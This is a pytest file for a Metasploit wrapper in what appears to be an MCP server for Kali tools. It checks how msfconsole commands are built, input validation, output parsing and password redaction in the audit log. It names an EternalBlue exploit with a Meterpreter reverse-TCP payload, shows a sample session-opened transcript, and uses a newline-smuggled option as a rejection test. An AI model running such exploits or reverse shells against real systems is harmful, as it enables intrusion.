# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Metasploit (`msfconsole -x`) wrapper tests.

These go through the `@active_tool` path (run_module is decorated), so
they also exercise the audit-log + redaction story. `run.run` is patched
— no real subprocess spawns.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from kalimcp import audit
from kalimcp.tools import metasploit


def _fake_result(stdout: str = "ok") -> dict:
    return {
        "exit_code": 0,
        "elapsed_s": 0.01,
        "stdout": stdout,
        "stderr": "",
        "truncated": False,
        "timed_out": False,
        "argv": ["msfconsole"],  # non-empty so the untrusted/log path runs
    }


@pytest.mark.asyncio
async def test_run_module_argv_shape():
    with patch(
        "kalimcp.tools.metasploit.run.run", new=AsyncMock(return_value=_fake_result())
    ) as m:
        result = await metasploit.run_module(
            target="10.0.0.5",
            module="exploit/windows/smb/ms17_010_eternalblue",
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost="10.0.0.1",
            lport=4444,
            options="SMBUser=guest;VERBOSE=true",
        )
    assert result["ok"] is True
    argv = m.call_args.args[0]
    assert argv[:4] == ["msfconsole", "-q", "-n", "-x"]
    assert len(argv) == 5
    rc = argv[4]
    assert "use exploit/windows/smb/ms17_010_eternalblue" in rc
    assert "set RHOSTS 10.0.0.5" in rc
    assert "set PAYLOAD windows/x64/meterpreter/reverse_tcp" in rc
    assert "set LHOST 10.0.0.1" in rc
    assert "set LPORT 4444" in rc
    assert "set SMBUser guest" in rc
    assert "set VERBOSE true" in rc
    assert "run" in rc.split("; ")
    assert "exit -y" in rc


@pytest.mark.asyncio
async def test_run_module_minimal_argv_omits_optional_sets():
    with patch(
        "kalimcp.tools.metasploit.run.run", new=AsyncMock(return_value=_fake_result())
    ) as m:
        await metasploit.run_module(target="10.0.0.5", module="auxiliary/scanner/smb/smb_login")
    rc = m.call_args.args[0][4]
    assert "set PAYLOAD" not in rc
    assert "set LHOST" not in rc
    assert "set LPORT" not in rc
    assert "set PASSWORD" not in rc
    assert rc.startswith("use auxiliary/scanner/smb/smb_login; set RHOSTS 10.0.0.5")


@pytest.mark.asyncio
async def test_run_module_bad_module_rejected_without_running():
    with patch(
        "kalimcp.tools.metasploit.run.run", new=AsyncMock()
    ) as m:
        result = await metasploit.run_module(target="10.0.0.5", module="-evil")
    m.assert_not_called()
    assert result["ok"] is True  # active_tool wraps the error_result
    assert "may not begin with '-'" in result["stderr"]


@pytest.mark.asyncio
async def test_run_module_newline_option_rejected():
    with patch(
        "kalimcp.tools.metasploit.run.run", new=AsyncMock()
    ) as m:
        result = await metasploit.run_module(
            target="10.0.0.5",
            module="auxiliary/scanner/smb/smb_login",
            options="FOO=bar\nrun",
        )
    m.assert_not_called()
    assert "newline or null byte" in result["stderr"]


_SESSION_SAMPLE = """[*] Started reverse TCP handler on 10.0.0.1:4444
[+] 10.0.0.5:445 - The target is vulnerable.
[*] Sending stage (200774 bytes) to 10.0.0.5
[*] Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.0.5:49158)
[-] 10.0.0.6:445 - Exploit failed: target not vulnerable
meterpreter >
"""


@pytest.mark.asyncio
async def test_run_module_parses_session_opened():
    fake = _fake_result(stdout=_SESSION_SAMPLE)
    with patch("kalimcp.tools.metasploit.run.run", new=AsyncMock(return_value=fake)):
        result = await metasploit.run_module(
            target="10.0.0.5",
            module="exploit/windows/smb/ms17_010_eternalblue",
        )
    parsed = result["parsed"]
    assert parsed["sessions_opened"] == 1
    assert any("The target is vulnerable" in s for s in parsed["successes"])
    assert any("Exploit failed" in f for f in parsed["failures"])
    assert parsed["raw_tail"]


@pytest.mark.asyncio
async def test_run_module_password_redacted_in_audit_log(tmp_path, monkeypatch):
    """A `password=` kwarg must NOT appear verbatim in the audit-logged
    argv — the active_tool decorator redacts it by value."""
    monkeypatch.delenv("KALIMCP_NO_LOG", raising=False)
    log_path = tmp_path / "audit.log"
    audit.reset_for_test()
    audit.configure(path=log_path)

    # Echo the real argv back in the result so the decorator logs the
    # actual (secret-bearing) command line, exercising the redactor.
    async def _echo(argv, **_kw):
        r = _fake_result()
        r["argv"] = argv
        return r

    try:
        with patch(
            "kalimcp.tools.metasploit.run.run", new=AsyncMock(side_effect=_echo)
        ) as m:
            await metasploit.run_module(
                target="10.0.0.5",
                module="auxiliary/scanner/smb/smb_login",
                password="hunter2",
            )
        # The real argv handed to run.run carries the secret...
        rc = m.call_args.args[0][4]
        assert "set PASSWORD hunter2" in rc
        # ...but the audit log must not.
        rows = [
            json.loads(line)
            for line in Path(log_path).read_text(encoding="utf-8").splitlines()
            if line
        ]
        invoke = next(r for r in rows if r["event"] == "tool_invoke")
        assert invoke["tool"] == "metasploit"
        assert invoke["secrets_redacted"] is True
        logged = json.dumps(invoke["argv"])
        assert "hunter2" not in logged
        assert "sha256:" in logged
    finally:
        audit.reset_for_test()
